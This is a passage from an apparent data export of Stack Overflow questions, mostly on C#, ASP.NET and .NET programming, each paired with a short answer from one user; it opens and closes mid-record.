   at System.Windows.Application.RunInternal(Window window)
   at System.Windows.Application.Run(Window window)
</code></pre>

<p>Now, if we are to believe Reflector the calling method (Dispatcher.Invoke) calls </p>

<pre><code>...,TimeSpan.FromSeconds(-1.0),...
</code></pre>

<p>which throws an Argument exception because the argument being passed in returns true on double.IsNaN. This is clearly not making any sense and we find this very puzzling, to say the least. </p>

<p>We have been unable to reproduce this behavior in any smaller samples, so we are looking for ways to determine the cause of this (and other seemingly related TimeSpan exceptions which are also thrown) in our full app. We have a number of questions they we hope someone can help us with, as we have had no luck in googling for anything like this</p>

<ul>
<li>Has anybody seen such behavior or recognize the symptoms</li>
<li>What causes these seemingly random behavior in basic math, are we somehow corrupting the stack or heap?</li>
<li>Can we somehow debug the IL in TimeSpan.Interval (WinDbg perhaps?) and break and inspect the stack/heap to verify the values?</li>
</ul>

<p>Our application is quite data heavy, with lots of data being fetched async and lots of data binding, but we see no smoking gun pointing at any of this from the stack traces we have been able to obtain.</p>

<p>Just to clarify the question: Has anybody seen the described behavior before, recognizes the symptoms or has input as to how we can debug the situation?</p>

<p>Thoughts, comments, ideas, suggestions?</p>
","33708","Mehrdad Afshari","<p>I'm not sure I understand your question correctly but I don't think -1.0 is NaN.</p>

<p>EDIT (To solve the actual problem): You could download .NET Framework symbols and debug through them to see the actual value of the variable passed to <code>TimeSpan.FromSeconds</code> and whatever else that might be going on.</p>
"
"<p>I am using jQuery to call web service (*.asmx) methods. The web service uses FormsAuthentication to determine whether the calling user is authenticated. I am unable to return a redirect status code from the web method, e.g.</p>

<pre><code>[WebMethod(EnableSession=true)]
public Dictionary&lt;string, object&gt; GetArchivedFiles(int pageSize, int page)
{
    if(HttpContext.Current.User.Identity.IsAuthenticated &amp;&amp; Session[""UserId""] != null)
        // Do some computing and return a Dictionary.       

    // Method will fall through here if the user is not authenticated.
    HttpContext.Current.Response.StatusCode = (int) HttpStatusCode.Unauthorized;
    return null;
}
</code></pre>

<p>The redirect does not work, I always get 500 Internal Server Error when doing this. I tried different codes. What would be the recommended way to go here? I need to read the redirect information from JavaScript and load the new page (or maybe display a login control AJAX way).</p>

<p>I actually get a JSON object back, which looks like this:</p>

<pre><code>{""Message"":""Authentication failed."",""StackTrace"":null,""ExceptionType"":""System.InvalidOperationException""
}
</code></pre>

<p>I tried running the debugger, but it doesn't show that any methods are entered. As you can see the StackTrace is null...</p>

<p>When invoked in Fiddler as a standard POST request (not XMLHttpRequest) it returns an exception actually:</p>

<pre><code>HTTP/1.1 500 Internal Server Error
Server: ASP.NET Development Server/9.0.0.0
Date: Wed, 04 Mar 2009 14:46:02 GMT
X-AspNet-Version: 2.0.50727
Cache-Control: private
Content-Type: text/plain; charset=utf-8
Content-Length: 1739
Connection: Close

System.NotSupportedException: The type System.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Object, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]] is not supported because it implements IDictionary.
   at System.Xml.Serialization.TypeScope.GetDefaultIndexer(Type type, String memberInfo)
   at System.Xml.Serialization.TypeScope.ImportTypeDesc(Type type, MemberInfo memberInfo, Boolean directReference)
   at System.Xml.Serialization.TypeScope.GetTypeDesc(Type type, MemberInfo source, Boolean directReference, Boolean throwOnError)
   at System.Xml.Serialization.ModelScope.GetTypeModel(Type type, Boolean directReference)
   at System.Xml.Serialization.XmlReflectionImporter.ImportTypeMapping(Type type, XmlRootAttribute root, String defaultNamespace)
   at System.Xml.Serialization.XmlReflectionImporter.ImportTypeMapping(Type type, XmlRootAttribute root)
   at System.Web.Services.Protocols.XmlReturn.GetInitializers(LogicalMethodInfo[] methodInfos)
   at System.Web.Services.Protocols.XmlReturnWriter.GetInitializers(LogicalMethodInfo[] methodInfos)
   at System.Web.Services.Protocols.MimeFormatter.GetInitializers(Type type, LogicalMethodInfo[] methodInfos)
   at System.Web.Services.Protocols.HttpServerType..ctor(Type type)
   at System.Web.Services.Protocols.HttpServerProtocol.Initialize()
   at System.Web.Services.Protocols.ServerProtocol.SetContext(Type type, HttpContext context, HttpRequest request, HttpResponse response)
   at System.Web.Services.Protocols.ServerProtocolFactory.Create(Type type, HttpContext context, HttpRequest request, HttpResponse response, Boolean&amp; abortProcessing)
</code></pre>
","33708","Mehrdad Afshari","<p>You should not redirect from the Web service. It should return a value to indicate whether or not you should redirect (<em>This could be a separate <code>Authenticate</code> method that returns a <code>string</code>, if it's null, it means it's authenticated, if it isn't it'll contain the redirection URL</em>) Then in javascript, you could check the return value and redirect appropriately by setting the <code>window.location</code> property.</p>

<p>By the way, access to the Web service should not require authentication.</p>
"
"<p>I have written a message board as my first ASP.NET project. It seems to work well so far. However, one of the features I have is that each message has a spam rating. It is simply the number of times that viewers have marked the message as spam divided by the total number of times the message has been viewed. The idea is to allow users to ignore messages with high spam ratings if they choose to do so.</p>

<p>However, the whole system can be foiled by a spammer simply viewing his own message and refreshing it a bunch of times, which will increase the number of times the message has been viewed. It can also be foiled by someone who marks the message as spam a bunch of times in a row. I need a way to determine whether a particular visitor has already viewed a particular message, and a way to determine whether a particular user has already marked a particular message as spam.</p>

<p>I don't want to require registration - I want anyone to be able to view or post messages. Two ideas I've been considering are setting a cookie when the visitor gets onto the site so I can track them, or creating a new data table that logs IP addresses of users when they view a message or mark it as spam. Can anyone else think of a better way? Does .NET have any built in features that might help me determine whether the visitor is viewing a page for the first time?</p>
","33708","Mehrdad Afshari","<p>The most reliable measure is IP address filtering as the spammer could circumvent any other method by writing his own program to request the page. It will affect your clients behind NAT, but for spam filtering purposes, it works pretty OK.</p>
"
"<p>I'm writing an XNA game where I do per-pixel collision checks. The loop which checks this does so by shifting an int and bitwise ORing and is generally difficult to read and understand.</p>

<p>I would like to add private methods such as <code>private bool IsTransparent(int pixelColorValue)</code> to make the loop more readable, but I don't want the overhead of method calls since this is very performance sensitive code.</p>

<p>Is there a way to force the compiler to inline this call or will I do I just hope that the compiler will do this optimization? </p>

<p>If there isn't a way to force this, is there a way to check if the method was inlined, short of reading the disassembly? Will the method show up in reflection if it was inlined and no other callers exist?</p>

<p><strong>Edit:</strong> I can't force it, so can I detect it?</p>
","33708","Mehrdad Afshari","<p>Nope, you can't. </p>

<p>Basically, you can't do that in most modern C++ compilers either. <code>inline</code> is just an offer to the compiler. It's free to take it or not.</p>

<p>The C# compiler does not do any special inlining at the IL level. JIT optimizer is the one that will do it.</p>
"
"<p>how can i make a tcp (ive heard it called a listener?) server (simplicity is optional at this point) that can recieve data from a client thats connected as well as send data back to that individual client (more multiple clients)?</p>

<p>ive done several tutorials but i could not get any of them to work or they did not do what i was hoping they would do. anyway, any help is most appreciated.</p>
","33708","Mehrdad Afshari","<p>You could either manually use a <code>Socket</code> or for a more high level view, use <a href=""http://msdn.microsoft.com/en-us/library/system.net.sockets.tcplistener(VS.71).aspx"" rel=""nofollow""><code>TcpListener</code> class</a>.</p>
"
"<p>I'm finding references to this namespace but it is not actually in System.Design. If I add the line 
LOGFONT lf; 
to my code, the editors dropdown suggestions include:</p>

<p>System.Design.NativeMethods.LOGFONT</p>

<p>Do you know where to pick it up? I'm having trouble tracking it down. Is it some sort of a 3rd party add-on? It's not in the add references dialog list.</p>
","33708","Mehrdad Afshari","<p>It is an <code>internal</code> class. It means, it's only accessible to classes defined inside that assembly.</p>
"
"<p>The following code does not produce an exception but instead passes the value 4 to tst. Can anyone explain the reason behind this? </p>

<pre><code> public enum testing
 { 
    a = 1,
    b = 2,
    c = 3
 }

testing tst = (testing)(4);
</code></pre>
","33708","Mehrdad Afshari","<p>In C#, unlike Java, enums are not checked. You can have any value of the underlying type. This is why it's pretty important to check your input.</p>

<pre><code>if(!Enum.IsDefined(typeof(MyEnum), value))
     throw new ArgumentOutOfRangeException();
</code></pre>
"
"<p>How to detect the presence of Extended ASCII values (128 to 255) in a C++ character array.</p>
","33708","Mehrdad Afshari","<pre><code>bool detect(const signed char* x) {
  while (*x++ &gt; 0);
  return x[-1];
}
</code></pre>
"
"<p>i have a sql query that can bring back a large number of rows via a DataReader. Just now I query the DB transform the result set into a List(of ) and data bind the Grid to the List. </p>

<p>This can result occasionally in a timeout due to the size of Dataset. </p>

<p>I currently have a three teir setup where by the UI is acting on the List of objects in the business layer. </p>

<p>Can anyone suggest the best approach to implementing lazy loading in this scenatrio? or is there some other way of implementing this cleanly? </p>

<p>I am currently using Visual Studio 2005, .NET 2.0</p>

<p>EDIT: How would paging be used in this instance? </p>
","33708","Mehrdad Afshari","<p>LINQ to SQL seems to make sense in your situation.</p>

<p>Otherwise if for any reason, you don't want to use LINQ to SQL (e.g. you are on .NET 2.0), consider writing an iterator that reads the <code>DataReader</code> and converts it to the appropriate object:</p>

<pre><code>IEnumerator&lt;MyObject&gt; ReadDataReader() {
  while(reader.MoveNext())
    yield return FetchObject(reader);
}
</code></pre>
"
"<p>Is there any difference in performance when running two executables with mono in linux, if:</p>

<p>1) the one executable has been compiled from c# source code previously in windows (e.g.VS). </p>

<p>2) the other executable has been compiled from the same source with gmcs in linux.</p>
","33708","Mehrdad Afshari","<p>It shouldn't matter from mono runtime's perspective since they are both valid IL codes (assuming compilers are bug-free).</p>

<p>There might be a performance difference which can be attributed to the level of optimization done by the <em>C# compiler</em>.</p>
"
"<p>My google-fu has failed me - can MonoDevelop be used on Windows?  Preferably without having to compile from source?</p>

<p>It works well on my home Ubuntu box, and while I have Visual Studio at work, it seems there might be some advantages to having MonoDevelop too.</p>

<p>EDIT: I'm aware of SharpDevelop; I'd prefer to have MonoDevelop if possible, just because I've started to get familiar with the interface, and I believe the SharpDevelop and MonoDevelop are not so closely related any more.</p>

<hr>

<p>Woohoo! <a href=""http://monodevelop.com/Download"" rel=""nofollow"">MonoDevelop for Windows is a supported download.</a></p>
","33708","Mehrdad Afshari","<p>Try <a href=""http://www.icsharpcode.net/OpenSource/SD/"" rel=""nofollow"">SharpDevelop </a>. MonoDevelop is built on SharpDevelop's code base.</p>
"
"<p>I have the following class:</p>

<pre><code>class SampleClass
{
   private ArrayList mMyList;

   SampleClass()
   {
       // Initialize mMyList
   }

   public ArrayList MyList
   {
       get { return mMyList;}
   }
}
</code></pre>

<p>I want users to be able to get mMyList which is why i exposed the ""get"" via a property however i don't want changes they make to the object (ie. MyList.Add(new Class());) to make its way back into my class.</p>

<p>I guess i can return a copy of the object but that may be slow and i'm looking for a way that will provide a compile-time error informing the user that they shouldn't expect to be able to modify the returned value from the Property.</p>

<p>Is this possible?</p>
","33708","Mehrdad Afshari","<p>You should wrap the return value in a read only collection.</p>
"
"<pre><code>private List&lt;string&gt; _Baseline = new List&lt;string&gt;();

public List&lt;string&gt; Baseline 
{
    get { return _Baseline; }
    set { _Baseline = value; }
}
</code></pre>

<p>How can I set this property?
It does not let me add using the add method; it throws an ""object reference null"" error. </p>
","33708","Mehrdad Afshari","<p>Do you initialize the class (using <code>new</code>) that holds this property before use?</p>

<p>There are two possible cases (assuming your code is in <code>MyClass</code> class):</p>

<pre><code>//External code:
MyClass x = new MyClass();
x.Baseline = null; // Somewhere it'll be set to null.
x.Baseline.Add(""Something""); // NullReferenceException
</code></pre>

<p>Or:</p>

<pre><code>//External code:
MyClass x = null; // Somewhere the class itself is set to null.
x.Baseline.Add(""Something""); // NullReferenceException
</code></pre>
"
"<p>I'm doing a custom authentication method that uses a light session object to hold a user's authorization details. Now I want each page (mainly child pages of masters) to be able to tell whether a user should have access to the page.</p>

<p>Should I create a page class and derive the child pages from that? </p>

<p>What's the best way for the application to know which roles have access to which page? </p>
","33708","Mehrdad Afshari","<p>If you need much flexibility in authorization, you'd better go with a custom page class. Otherwise, <code>Web.config</code> should be enough.</p>
"
"<p>I'm working on a PHP/MySQL rating system right now. For the user to be able to rate the user has to log in. Each user has a unique ""UID"". There will be multiple rating instances on the website (one for every game, in my case) and I need an efficient way of storing a list of UIDs in a MySQL row (one MySQL row in the ratings table for each instance of the rating system) to keep a tally of who has voted. </p>

<p>I've seen in other systems that the list is stored in a serialized PHP array. Every time a user votes, then serialized array has to extracted, unserialized, the new UID is inserted, the array is re-serialized, and the MySQL row is UPDATEd. Every time the page is loaded, that list has to once again be unserialized and checked to see if the user viewing the page has voted yet to make sure the user doesn't vote twice. </p>

<p>This seems kind of inefficient and cumbersome. Does MySQL have a built in list function to help this process be more efficient? Are there any more clever ways I could fix this problem?</p>

<p>I've considered one possible alternative which is forget the serializing and store the UIDs in a TEXT type field in the MySQL database. I would just append some non-numeric character after each UID (let's say a period [.]). To add a user entry I would just concatenate the UID onto the end of the TEXT field and then a period. When checking if the user has already voted I could just ""SELECT * FROM table WHERE votes = '%$UID.%';"". Would this work more efficiently or is there a more elegant way of getting the job done?</p>

<p><strong>Follow-up post about the table structure... <a href=""http://stackoverflow.com/questions/621065/efficient-mysql-table-structure-for-rating-system"">Efficient MySQL table structure for rating system</a></strong></p>
","33708","Mehrdad Afshari","<p>In a normalized database, you should store it in a junction table:</p>

<pre><code>UserRatings
-------------
RatingID int
UserID int
UserVote int
</code></pre>

<p>I don't know what are your queries. Depending on the application, this might not have the acceptable performance. However, in either case, I suggest you go with the normalized approach, benchmark, and denormalize only if appropriate.</p>
"
"<p>I have a very simple question.</p>

<p>I am trying to rotate a vector around a certain point on the vector(in C++):</p>

<pre><code>1 2 3
4 5 6
7 8 9
</code></pre>

<p>rotated around the point (1,1) (which is the ""5"")  90 degrees would result in:</p>

<pre><code>7 4 1
8 5 2
9 6 3
</code></pre>

<p>Right now I am using:</p>

<pre><code>x = (x * cos(90)) - (y * sin(90))
y =(y * cos(90)) + (x * sin(90))
</code></pre>

<p>But I don't want it rotated around (0,0)</p>

<p>Thanks!</p>
","33708","Mehrdad Afshari","<p>The solution is to translate the vector to a coordinate system in which the center of rotation is (0,0). Apply the rotation matrix and translate the vector back to the original coordinate system.</p>

<p>dx = x of rotation center<br />
dy = y of rotation center</p>

<p>V2 = V - [dx, dy, 0]<br />
V3 = V2 * rotation matrix<br />
Result = V3 + [dx, dy, 0]</p>
"
"<p>I am trying to create an array of pointers. These pointers will point to a Student object that I created. How do I do it?
What I have now is: </p>

<pre><code>Student * db = new Student[5];
</code></pre>

<p>But each element in that array is the student object, not a pointer to the student object.
Thanks.</p>
","33708","Mehrdad Afshari","<pre><code>Student** db = new Student*[5];
// To allocate it statically:
Student* db[5];
</code></pre>
"
"<p>I have this code: </p>

<pre><code>    public IEnumerable&lt;int&gt; Iterator {
        get { if (false) yield return -1; }
    }
</code></pre>

<p>It is fairly ugly, but when you try to refactor it to: </p>

<pre><code>    public IEnumerable&lt;int&gt; Iterator {
        get { return null; }
    }
</code></pre>

<p>The following code breaks: </p>

<pre><code>foreach (var item in obj.Iterator) {
}
</code></pre>

<p>How would you go about cleaning this up? </p>
","33708","Mehrdad Afshari","<pre><code>public IEnumerable&lt;int&gt; Iterator {
    get { yield break; }
}
</code></pre>
"
"<p>Is there an arbitrary-precision <em>decimal</em> class available for C#? I've seen a couple of arbitrary precision integer classes, but that's not quite the same thing.</p>
","33708","Mehrdad Afshari","<p>You can use J# library's <code>java.math.BigDecimal</code> class if you have it installed. Just add a reference to <code>vjslib</code>.</p>

<pre><code>/me remembers one of the betas in which we had System.Numeric.BigDecimal, sigh
</code></pre>
"
"<p>I've searched the IIS7 MSDN database but can't find any <em>concrete</em> material on how to create custom C#.NET extensions for IIS7, I know that previously in IIS6 you had to write an ISAPI extension in C++ if you wanted to say plug in your own scripting language for websites (this is sort of what I want to do) but in IIS7 you're supposed to be able to write it using C#.NET and utilizing the new plugable architecture of IIS7... but I can't find any sodding docs on how to do it.</p>

<p>Anyone care to point me in the right direction?</p>
","33708","Mehrdad Afshari","<p>In IIS7 Integrated mode, HTTP Modules are equivalent to ISAPI filters and HTTP Handlers are equivalent to ISAPI extensions.</p>
"
"<p>I am using VS 2008 MVC.</p>

<p>I developed a controller.</p>

<p>Form controller i fetch the data by using LinqToSql.
&amp; i am retuning a <strong>list</strong> of that data.</p>

<p>e.g. return View(Students.Tolist());</p>

<p>now i want to display the list using ""<code>foreach</code>"" loop in view.</p>

<p>so how do i achieve it?</p>
","33708","Mehrdad Afshari","<p>You should have a <code>Student</code> class to hold the records outputted by LINQ to SQL. Anonymous types don't work well in this scenario.</p>

<pre><code>&lt;% foreach (var item in (IEnumerable&lt;Student&gt;)ViewData.Model) { %&gt;
      &lt;div class=""student""&gt;
          Name: &lt;%= item.Name %&gt;  &lt;br /&gt;
          GPA:  &lt;%= item.GPA %&gt; 
      &lt;/div&gt;
&lt;% } %&gt;
</code></pre>
"
"<p>For C# Visual Studio uses 4 spaces by default, whereas for C++ it is hard-tabs. Why is it so? Why is it different?</p>

<p>My project consists of both C# and C++ code and the difference really annoys me. I want to set a common standard for all the sources, but I wonder if this would have any drawbacks.</p>
","33708","Mehrdad Afshari","<p>I doubt there are any drawbacks as C++ grammar doesn't distinguish between tabs and spaces. 
By the way, I think the best way to set code style standards is to export VS settings and share it with the team.</p>
"
"<p>Why are semicolons necessary at the end of each line in C#?
Why can't the complier just know where each line is ended?</p>
","33708","Mehrdad Afshari","<p>The line terminator character will make you be able to break a statement across multiple lines.</p>

<p>On the other hand, languages like VB have a <em>line continuation character</em>. I personally think it's much cleaner to terminate statements with a semicolon rather than continue using underscores.</p>
"
"<p>I've seen static methods written (but I've never run the code) which uses instance data from another class (instance based).</p>

<p>Usually, instance data work with instance methods and likewise for static fields/methods. What is the implication of working on static data in an instance method? I'm assuming it is frowned upon but I can't find any details on what will happen under the hood. Also, what about instance methods working with static data?</p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>Basically, instance methods has a hidden <code>this</code> parameter which is used to pass the instance the method is supposed to work on. This is the reason static methods cannot access instance data without explicit reference (as they cannot know which instance of object they should access).</p>

<p>Considering this, I don't see any special difference between static and instance methods. They are both methods and has more similarities than differences.</p>

<p>Both static data and instance data are prone to threading issues, however, instances are much less likely to be used between threads. As a consequence, accessing static fields might require more care (regarding syncronization issues).</p>
"
"<p>Can we use nant to build .sln files in C#?</p>
","33708","Mehrdad Afshari","<p>You can invoke <code>msbuild</code> as a nant task.</p>
"
"<p>in a noncompiled .aspx, is it possible to have 2 partial class files for one aspx?  I'm trying to do something like:<pre>
    &lt;%@ Page 
        Language=""C#"" 
        inherits=""_Default"" 
        src=""Default.aspx.cs"" 
        src=""Default2.aspx.cs"" %>
</pre></p>

<p>Both Default and Default2 have the partial class defined</p>

<p>Update:  Yep.. It's not compiled or the point would be moot as I'd just chuck the corresponding dll's in the /bin directory.  I need to have this not compiled because the source needs to be changed regularly.  I probably could come up with a way to just update the aspx, but I'd like to not have to do that.</p>

<p>The reason I'm using two source files is that there is a lot of source code that connects to my database and whatnot.  I have one person that's gonna muck with the db stuff and another person to muck with the other logic.  I'd prefer to have these files separate so they don't have to muddle through code that they don't need to look at</p>
","33708","Mehrdad Afshari","<p>No, at most a single <code>Src</code> attribute may be specified.</p>
"
"<p>What is the best way to recursively copy a folder's content into another folder using C# and ASP.NET?</p>
","33708","Mehrdad Afshari","<p>Just use <code>Microsoft.VisualBasic.FileIO.FileSystem.CopyDirectory</code> in <code>Microsoft.VisualBasic.dll</code> assembly.</p>

<p>Add a reference to <code>Microsoft.VisualBasic</code></p>

<pre><code>Microsoft.VisualBasic.FileIO.FileSystem.CopyDirectory(source, destination);
</code></pre>
"
"<p>Its been a long time since I had to do anything but minor fixes with ASP.NET and I've never deployed a ASP.NET 2.0/3.5 application so probably I'm just missing something simple  but I definitely need help.</p>

<p>Basically, we have a poorly written .NET 1.1 web application and we had some contractors come in and break some of our third-party dependencies and update it to a poorly written .NET 3.5 web application (the poorly written part will be addressed later).</p>

<p>So now I'm practicing deployment scenarios on a virtual machine set up like our deployment environment.</p>

<ol>
<li>I installed the 3.5 framework </li>
<li>I compiled the new code and used visual studio's Build>Publish option as recommended by the contractors to output only the files the application requires.</li>
<li>I copied all the files to a new directory inside of Inetpub on the VM and configured the web.config </li>
<li>I created a new application pool </li>
<li>I created a new IIS website pointed to the new directory and using the new application pool.  I configured it to use version 2.0 under the IIS ASP.NET tab</li>
</ol>

<p>But navigating to the loginpage I get:</p>

<pre><code>Parser Error Message: The file '/View/LoginPage.aspx.cs' does not exist.

Line 1:  &lt;%@ Page Language=""C#"" MasterPageFile=""~/MasterPage/LoginMasperPage.Master"" AutoEventWireup=""true""
Line 2:      CodeFile=""LoginPage.aspx.cs"" Inherits=""MyApp.View.LoginPage"" Title=""MyApp - Login Page"" %&gt;
</code></pre>

<p>What gives?  In the .NET 1.1 version of the application all the c# code was compiled into the MyApp.dll and the application knew to look there.  Double checking with reflector, all the code is in the binary here too, just the server isn't looking there for it.  </p>

<p>What can be going on?  I can wait for the contractors to get in tomorrow, or compile everything including the aspx files into the binary, but we have good reasons for keeping the aspx files uncompiled and I'd like to deploy today if possible.</p>

<p>Please note, that this is not ASP.NET MVC, the view namespace/directory is simply where all the webforms are kept</p>
","33708","Mehrdad Afshari","<p>You have probably used the Web site model for your updated application. Consider using a Web application project instead.</p>
"
"<p>Consider this method signature:</p>

<pre><code>public static void WriteLine(string input, params object[] myObjects)
{
    // Do stuff.
}
</code></pre>

<p>How can I determine that the WriteLine method's ""myObjects"" pararameter uses the params keyword and can take variable arguments?</p>
","33708","Mehrdad Afshari","<p>Check for the existence of <code>[ParamArrayAttribute]</code> on it.</p>

<p>The parameter with <code>params</code> will always be the last parameter.</p>
"
"<p>Does anyone have any idea what the practical differences are between the System.Collections.Specialized.StringDictionary object and System.Collections.Generic.Dictionary?</p>

<p>I've used them both in the past without much thought as to which would perform better, work better with Linq, or provide any other benefits.</p>

<p>Any thoughts or suggestions as to why I should use one over the other?</p>
","33708","Mehrdad Afshari","<p><code>Dictionary&lt;string, string&gt;</code> is a more modern approach. It implements <code>IEnumerable&lt;T&gt;</code> and it's more suited for LINQy stuff. </p>

<p><code>StringDictionary</code> is the old school way. It was there before generics days. I would use it only when interfacing with legacy code.</p>
"
"<p>Under ASP.NET MVC are you supposed to pick up QueryString params the same way you do in ASP.NET WebForms? or does the [AcceptVerbs(HttpVerbs.Get)] declaration get used somehow?</p>
","33708","Mehrdad Afshari","<p>You can always use <code>Request.QueryString</code> collection like Web forms, but you can also make MVC handle them and pass them as parameters. This is the suggested way as it's easier and it will validate input data type automatically.</p>
"
"<p>I'm pretty new to the ASP.NET world so I'm having a little trouble coming up with the best way to configure a connection string at runtime and have the entire application use that connection string.  Here is a little more info on the application that I plan to build:</p>

<ul>
<li>Application uses Forms authentication, not Windows authentication</li>
<li>There will be a Login page where the user supplies their SQL Server login ID and password</li>
<li>For simplicity, I would like to have all the SQLDataSource controls point to a web.config connection string.  This would be done at design time rather than setting them programatically.  So, they would have a property like this:
 ConnectionString=""&lt;%$ ConnectionStrings:MyDB %>""</li>
<li>I'd like to find a way to change the ""MyDB"" connection string at runtime so it uses the login id and password that the user provided.  But I do NOT want this saved to web.config.  It should only be active for that user's session.</li>
</ul>

<p>What is the ""standard"" way that people usually do this?  I assume one method would be to create a Session variable with the connection string and then programatically change the ConnectionString property of every SQLDataSource control during page load.  But I was hoping to avoid that if possible.</p>

<hr>

<p>Since a number of people asked about why I would want to use a unique connection for each user and were concerned about the lack of pooling, I figured I would comment on that here rather than comment on each individual response.</p>

<p>The nature of this application requires that every user connect to the database under their own account.  The back-end security is tied to their user account so we can't use generic accounts like ""user"" and ""administrator"".  We also need to know the specific identity of each user for auditing control.  The application usually only has 10 to 20 users, so the lack of pooling isn't a concern.  We could debate the merits of this approach another time, but unfortunately I don't have an option here - the project requires that each user connect to the database under their own account.</p>

<p>I would love to require Windows authentication, but unfortunately some implementations of this application will require SQL authentication.</p>

<p>If I could just set the connection string when I declare the SQLDataSource controls like this, it would be a snap:</p>

<pre><code>  &lt;asp:SqlDataSource ID=""SqlDataSource1"" runat=""server"" 
    ConnectionString = ""&lt;%= Session(""MyConnectionString"") %&gt;""
    SelectCommand=""SELECT * FROM [Customers]""&gt;
  &lt;/asp:SqlDataSource&gt;
</code></pre>

<p>But I get an error because it doesn't like &lt;% %> tags there.  If I can't do this when declaring the control, what is the easiest way to do this programatically for every SQLDataSource control in the application?</p>

<p>Thanks very much for everyone's help!</p>
","33708","Mehrdad Afshari","<p>Load the <code>Web.config</code> connection string to a session variable in <code>Session_Start</code>. If user provided his/her own credentials, update them in the session variable. Otherwise, the defaults (<code>web.config</code> values) will be in effect.</p>
"
"<p>I have a collection of MyClass that I'd like to query using LINQ to get distinct values, and get back a Dictionary&lt;string, string> as the result, but I can't figure out how I can do it any simpler than I'm doing below.  What would some cleaner code be that I can use to get the Dictionary&lt;string, string> as my result?</p>

<pre><code>var desiredResults = new Dictionary&lt;string, string&gt;(StringComparer.OrdinalIgnoreCase);

var queryResults = (from MyClass mc in myClassCollection
                    orderby bp.SomePropToSortOn
                    select new KeyValuePair&lt;string, string&gt;(mc.KeyProp, mc.ValueProp)).Distinct();

foreach (var item in queryResults)
{
    desiredResults.Add(item.Key.ToString(), item.Value.ToString());
}
</code></pre>
","33708","Mehrdad Afshari","<p>Use the <code>ToDictionary</code> method directly.</p>

<pre><code>var result = 
  // as Jon Skeet pointed out, OrderBy is useless here, I just leave it 
  // show how to use OrderBy in a LINQ query
  myClassCollection.OrderBy(mc =&gt; mc.SomePropToSortOn)
                   .ToDictionary(mc =&gt; mc.KeyProp.ToString(), 
                                 mc =&gt; mc.ValueProp.ToString(), 
                                 StringComparer.OrdinalIgnoreCase);
</code></pre>
"
"<p>In .Net Terminology, 'FormCollection' means 'Collection' of 'Forms'
'System.Windows.Forms.FormCollection' is collection of System.Windows.Forms.Form</p>

<p>In ASP.Net MVC, 'FormCollection' is little confusing. </p>

<p>Is it Collection of all Submit 'Forms' in webpage ?</p>

<p>(Or) Is it Collection of Input controls on paritcular form ?</p>
","33708","Mehrdad Afshari","<p>It is a collection of all input values specified in a POST request (which is probably all input values in a <strong>single</strong> form).</p>

<p>Similarly, <code>QueryStringCollection</code> holds all input values specified in a GET request.</p>
"
"<p>How can i convert an UTF-8 string into an ISO-8859-1 string?</p>
","33708","Mehrdad Afshari","<p>.NET Strings are all UTF-16 internally. There is no UTF-8 or ISO-8859-1 encoded <code>System.String</code> in .NET. To get the binary representation of the string in a particular encoding use <code>System.Text.Encoding</code> class:</p>

<pre><code>byte[] bytes = Encoding.GetEncoding(""iso-8859-1"").GetBytes(""hello world"");
</code></pre>
"
"<p>I have C# application that uses a dll. When I try to run the application, it can't find the dll, unless it is in the same directory or in GAC. I do not want to have it in the same directory and I do not want to install it to GAC.
Is there any way how to tell the application where to look for the library? (For example if I want to distribute the application to customers and they want to use their own applications that would use the dll.)</p>

<p>Added:</p>

<p>I would like to have this file structure:</p>

<p>MainFolder: Libraries, Applications</p>

<p>Libraries: lib.dll</p>

<p>Applications: app1.exe</p>

<p>I don't want to copy it to GAC or have lib.dll in folder Applications. Is it possible?</p>
","33708","Mehrdad Afshari","<p>Follow <a href=""http://msdn.microsoft.com/en-us/library/4191fzwb.aspx"" rel=""nofollow"">this guide on MSDN: Specifying an Assembly's Location</a></p>
"
"<p>This sounds like a ""why would you do that?"" sort of question, but here goes..</p>

<p>I have a very simple ASP.NET page which simply renders out a one column grid of about 10 rows with paging.</p>

<p>At the moment, I need (due to some technical restrictions) to essentially host the ASP.NET page within an IFRAME on a basic HTML page.  It works of course, although I wonder if there is a better way?</p>

<p>For some reason I am thinking something like silverlight (which I might end up using) being a container.. or some other ActiveX type control..</p>

<p>Hope this explains enough?</p>

<p>Thanks in advance!</p>
","33708","Mehrdad Afshari","<p>You might be able to use XmlHttpRequest to fetch the contents on ASP.NET page to an HTML element.</p>
"
"<p>Is there a built in linq method thing I can use to find out if two sequences contains the same items, not taking the order into account?</p>

<p>For example:</p>

<pre><code>{1, 2, 3} == {2, 1, 3}
{1, 2, 3} != {2, 1, 3, 4}
{1, 2, 3} != {1, 2, 4}
</code></pre>

<p>You have the SequenceEquals, but then I would have to Order both sequences first, wouldn't I?</p>
","33708","Mehrdad Afshari","<p>I think ordering the sequence is the fastest way you can achieve this.</p>
"
"<p>
Since I've started using rspec, I've had a problem with the notion of fixtures.  My primary concerns are this:

<ol><li>I use testing to reveal surprising behavior.  I'm not always clever enough to enumerate every possible edge case for the examples I'm testing.  Using hard-coded fixtures seems limiting because it only tests my code with the very specific cases that I've imagined.  (Admittedly, my imagination is also limiting with respect to which cases I test.)</li>
<li>I use testing to as a form of documentation for the code.  If I have hard-coded fixture values, it's hard to reveal what a particular test is trying to demonstrate.  For example:

<pre><code>describe Item do
  describe '#most_expensive' do
    it 'should return the most expensive item' do
      Item.most_expensive.price.should == 100
      # OR
      #Item.most_expensive.price.should == Item.find(:expensive).price
      # OR
      #Item.most_expensive.id.should == Item.find(:expensive).id
    end
  end
end
</code></pre>  Using the first method gives the reader no indication what the most expensive item is, only that its price is 100.  All three methods ask the reader to take it on faith that the fixture :expensive is the most expensive one listed in fixtures/items.yml.  A careless programmer could break tests by creating an Item in before(:all), or by inserting another fixture into fixtures/items.yml.  If that is a large file, it could take a long time to figure out what the problem is.</li></ol>
</p>

<p>
One thing I've started to do is add a '#generate_random' method to all of my models.  This method is only available when I am running my specs.  For example:<pre><code>
class Item
  def self.generate_random(params={})
    Item.create(
      :name => params[:name] || String.generate_random,
      :price => params[:price] || rand(100)
    )
  end
end
</code></pre>
(The specific details of how I do this are actually a bit cleaner.  I have a class that handles the generation and cleanup of all models, but this code is clear enough for my example.)  So in the above example, I might test as follows.  A warning for the feint of heart: my code relies heavily on use of 'before(:all)':
<pre><code>describe Item do
  describe '#most_expensive' do
    before(:all) do
      @items = []
      3.times { @items  50})
    end

    it 'should return the most expensive item' do
